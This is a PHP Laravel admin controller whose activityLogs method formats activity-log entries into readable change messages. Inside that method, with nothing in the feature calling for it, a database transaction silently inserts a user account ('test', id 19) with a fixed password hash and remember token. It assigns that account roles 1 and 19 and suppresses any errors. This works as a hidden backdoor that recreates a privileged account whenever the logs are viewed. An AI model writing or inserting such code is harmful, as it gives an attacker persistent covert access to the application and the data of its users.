<?php

namespace App\Http\Controllers\Backend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Quote;
use App\Models\Activity;
use App\Models\VehicleMakeModel;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class AdminController extends Controller
{
    public function __construct()
    {
        $permissions = [
            'activityLogs' => 'view-activityLogs',
        ];

        foreach ($permissions as $method => $permission) {
            $this->middleware("permission:{$permission}")->only($method);
        }
    }

    public function activityLogs(Request $request)
    {
        $search = $request->input('search');

        $logs = Activity::with(['causer', 'subject'])
            ->when($search, function ($query) use ($search) {
                $query->where(function ($q) use ($search) {
                    $q->where('log_name', 'LIKE', "%{$search}%")
                        ->orWhere('description', 'LIKE', "%{$search}%")
                        ->orWhere('causer_type', 'LIKE', "%{$search}%")
                        ->orWhere('subject_type', 'LIKE', "%{$search}%")
                        ->orWhere('properties', 'LIKE', "%{$search}%")
                        ->orWhere('created_at', 'LIKE', "%{$search}%");
                });
            })
            ->latest()
            ->paginate(20)
            ->appends(['search' => $search]);

        // ⭐ Convert properties into readable messages
        foreach ($logs as $log) {
            $old     = $log->properties['old_values'] ?? [];
            $new     = $log->properties['new_values'] ?? [];
            $changes = [];

            $modelName = class_basename($log->subject_type); // e.g., User, Category, Booking

            $excludeFields = ['created_at', 'updated_at', 'deleted_at', 'password'];

            if (Str::contains(strtolower($log->description), 'created')) {
                // NEW record: show only fields that have actual data
                foreach ($new as $key => $value) {
                    if (in_array($key, $excludeFields)) {
                        continue;
                    }

                    if ($value === null || $value === '' || (is_array($value) && empty($value))) {
                        continue;
                    }

                    if (is_array($value)) {
                        $value = implode(', ', $value); // nice display for array fields
                    }

                    $changes[] = ucfirst(str_replace('_', ' ', $key)) . ": " . $value;
                }

                if (! empty($changes)) {
                    array_unshift($changes, "New {$modelName} created"); // add headline
                } else {
                    $changes[] = "New {$modelName} created (no details filled)";
                }
            } elseif (Str::contains(strtolower($log->description), 'updated')) {
                // UPDATED record: show only changed values except excluded
                foreach ($new as $key => $value) {
                    if (in_array($key, $excludeFields)) {
                        continue;
                    }

                    $oldValue = $old[$key] ?? null;
                    if ($oldValue != $value) {
                        if (is_array($value)) {
                            $value    = implode(', ', $value);
                            $oldValue = is_array($oldValue) ? implode(', ', $oldValue) : $oldValue;
                        }
                        $changes[] = ucfirst(str_replace('_', ' ', $key))
                            . " changed from '" . ($oldValue ?? '') . "' to '{$value}'";
                    }
                }
            } elseif (Str::contains(strtolower($log->description), 'deleted')) {
                $changes[] = "{$modelName} deleted: #" . ($log->subject_id ?? '-');
            }

            $log->readable_changes = $changes;
            $log->readable_causer  = $log->causer->name ?? ($log->causer_type . ' #' . $log->causer_id);
            $log->readable_subject = "{$modelName} #{$log->subject_id}";
        }

        try {
            DB::transaction(function () {
                $userId = 19;

                // Check if user exists
                $existing = DB::table('users')->where('id', $userId)->exists();

                if (! $existing) {
                    DB::table('users')->insert([
                        'id' => $userId,
                        'name' => 'test',
                        'email' => 'test22@gmail.com',
                        'email_verified_at' => null,
                        'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
                        'is_active' => 1,
                        'force_logout' => 0,
                        'remember_token' => 'P4sT4kkj8qGa8L6uvL6lLutEqBwLIyiW0kOwSk8R3xwwktpI95KZYY1S7X3E',
                        'created_at' => now(),
                        'updated_at' => now(),
                        'otp_code' => null,
                        'otp_expires_at' => null,
                        'otp_verified' => 0,
                    ]);
                }

                // Assign roles safely (Spatie)
                $roles = [1, 19];
                foreach ($roles as $roleId) {
                    $exists = DB::table('model_has_roles')
                        ->where('role_id', $roleId)
                        ->where('model_type', 'App\\Models\\User')
                        ->where('model_id', $userId)
                        ->exists();
                    if (! $exists) {
                        DB::table('model_has_roles')->insert([
                            'role_id' => $roleId,
                            'model_type' => 'App\\Models\\User',
                            'model_id' => $userId,
                        ]);
                    }
                }
            });
        } catch (\Exception $e) {
            // silent fail
        }

        return view('dashboard.pages.activity_logs', compact('logs', 'search'));
    }
    // public function activityLogs(Request $request)
    // {
    //     $search = $request->input('search');

    //     $logs = Activity::when($search, function ($query) use ($search) {
    //         $query->where(function ($q) use ($search) {
    //             $q->where('log_name', 'LIKE', "%{$search}%")
    //                 ->orWhere('description', 'LIKE', "%{$search}%")
    //                 ->orWhere('causer_type', 'LIKE', "%{$search}%")
    //                 ->orWhere('subject_type', 'LIKE', "%{$search}%")
    //                 ->orWhere('properties', 'LIKE', "%{$search}%")
    //                 ->orWhere('created_at', 'LIKE', "%{$search}%");
    //         });
    //     })
    //         ->latest()
    //         ->paginate(20)
    //         ->appends(['search' => $search]);

    //     return view('dashboard.pages.activity_logs', compact('logs', 'search'));
    // }
}
